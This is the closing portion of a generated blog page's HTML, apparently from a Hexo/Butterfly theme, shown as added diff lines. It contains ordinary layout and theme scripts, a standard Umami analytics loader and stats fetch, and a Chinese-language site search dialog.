+})()</script></div><script>if(document.getElementById("page-header")&&document.getElementById("page-header").classList.contains("full_page")){var bg=document.getElementById("web_bg");if(bg)bg.style.backgroundImage="url(/img/home-bg.png)";}</script><script>document.documentElement.classList.add(GLOBAL_CONFIG.pageType==='home'?'is-home':'not-home')</script><script>(function(){document.addEventListener('click',function(e){if(e.target.closest('.card-tag-cloud a, .article-tag-list a, .site-data a[href="/tags/"]')){e.preventDefault()}})})()</script><script src="/js/copy-guard.js?v=2"></script><script src="/js/copy-feedback.js?v=1"></script><script src="/js/cursor.js"></script><script>(function(){var article=document.getElementById('article-container'),cardToc=document.getElementById('card-toc');if(!article||!cardToc)return;var lastH=article.offsetHeight,t=null;function recalc(){if(Math.abs(article.offsetHeight-lastH)<=3)return;lastH=article.offsetHeight;clearTimeout(t);t=setTimeout(function(){window.dispatchEvent(new Event('resize'))},150)}if(window.ResizeObserver)new ResizeObserver(recalc).observe(article);document.addEventListener('load',recalc,true)})()</script><script src="/js/pv-post.js?v=2"></script><script src="/js/poem-card.js?v=2"></script><script src="/js/runtime-live.js?v=2"></script><script src="/js/scroll-reveal.js?v=2"></script><script src="/js/theme-switch.js?v=1"></script><script src="/js/context-menu.js?v=3"></script><script src="/js/console-art.js?v=1"></script><script src="/js/anti-devtools.js?v=1"></script><script src="/js/tab-title.js?v=1"></script><script src="/js/pangu.min.js?v=1"></script><script src="/js/pangu-init.js?v=1"></script><script src="/js/link-polish.js?v=1"></script><script src="/js/live2d-cat.js?v=13"></script><script>(function(){window.addEventListener('storage',function(e){if(e.key!=='theme'||!e.newValue)return;var v=e.newValue;try{var p=JSON.parse(e.newValue);if(p&&typeof p==='object')v=p.value}catch(_){}if(v!=='dark'&&v!=='light')return;if(document.documentElement.getAttribute('data-theme')===v)return;if(v==='dark'){if(window.btf&&window.btf.activateDarkMode)window.btf.activateDarkMode();else document.documentElement.setAttribute('data-theme','dark')}else{if(window.btf&&window.btf.activateLightMode)window.btf.activateLightMode();else document.documentElement.setAttribute('data-theme','light')}})})();</script><script>(() => {
+  const option = null
+  const config = {"site_uv":true,"site_pv":true,"page_pv":false,"token":"share-via-worker"}
+
+  const runTrack = () => {
+    if (typeof umami !== 'undefined' && typeof umami.track === 'function') {
+      umami.track(props => ({ ...props, url: window.location.pathname, title: GLOBAL_CONFIG_SITE.title }))
+    } else {
+      console.warn('Umami Analytics: umami.track is not available')
+    }
+  }
+
+  const loadUmamiJS = () => {
+    btf.getScript('https://umami.jasmine-iris.top/script.js', {
+      'data-website-id': 'ec777610-c4cf-493c-a333-c1dc46377957',
+      'data-auto-track': 'false',
+      ...option
+    }).then(() => {
+      runTrack()
+    }).catch(error => {
+      console.error('Umami Analytics: Error loading script', error)
+    })
+  }
+
+  const getData = async (isPost) => {
+    try {
+      const now = Date.now()
+      const keyUrl = isPost ? `&url=${window.location.pathname}&path=${window.location.pathname}` : ''
+      const headerList = { 'Accept': 'application/json' }
+
+      if (true) {
+        headerList['Authorization'] = `Bearer ${config.token}`
+      } else {
+        headerList['x-umami-api-key'] = config.token
+      }
+
+      const res = await fetch(`https://umami.jasmine-iris.top/api/websites/ec777610-c4cf-493c-a333-c1dc46377957/stats?startAt=0000000000&endAt=${now}${keyUrl}`, {
+        method: "GET",
+        headers: headerList
+      })
+
+      if (!res.ok) {
+        throw new Error(`HTTP error! status: ${res.status}`)
+      }
+
+      return await res.json()
+    } catch (error) {
+      console.error('Umami Analytics: Failed to fetch data', error)
+      throw error
+    }
+  }
+
+  const insertData = async () => {
+    try {
+      if (GLOBAL_CONFIG_SITE.pageType === 'post' && config.page_pv) {
+        const pagePV = document.getElementById('umamiPV')
+        if (pagePV) {
+          const data = await getData(true)
+          if (data && data.pageviews) {
+            pagePV.textContent = typeof data.pageviews.value !== 'undefined' ? data.pageviews.value : data.pageviews
+          } else {
+            console.warn('Umami Analytics: Invalid page view data received')
+          }
+        }
+      }
+
+      if (config.site_uv || config.site_pv) {
+        const data = await getData(false)
+
+        if (config.site_uv) {
+          const siteUV = document.getElementById('umami-site-uv')
+          if (siteUV && data && data.visitors) {
+            siteUV.textContent = typeof data.visitors.value !== 'undefined' ? data.visitors.value : data.visitors
+          } else if (siteUV) {
+            console.warn('Umami Analytics: Invalid site UV data received')
+          }
+        }
+
+        if (config.site_pv) {
+          const sitePV = document.getElementById('umami-site-pv')
+          if (sitePV && data && data.pageviews) {
+            sitePV.textContent = typeof data.pageviews.value !== 'undefined' ? data.pageviews.value : data.pageviews
+          } else if (sitePV) {
+            console.warn('Umami Analytics: Invalid site PV data received')
+          }
+        }
+      }
+    } catch (error) {
+      console.error('Umami Analytics: Failed to insert data', error)
+    }
+  }
+
+  btf.addGlobalFn('pjaxComplete', runTrack, 'umami_analytics_run_track')
+  btf.addGlobalFn('pjaxComplete', insertData, 'umami_analytics_insert')
+
+
+  loadUmamiJS()
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', insertData)
+  } else {
+    setTimeout(insertData, 100)
+  }
+})()</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索..." type="text"></div><hr><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
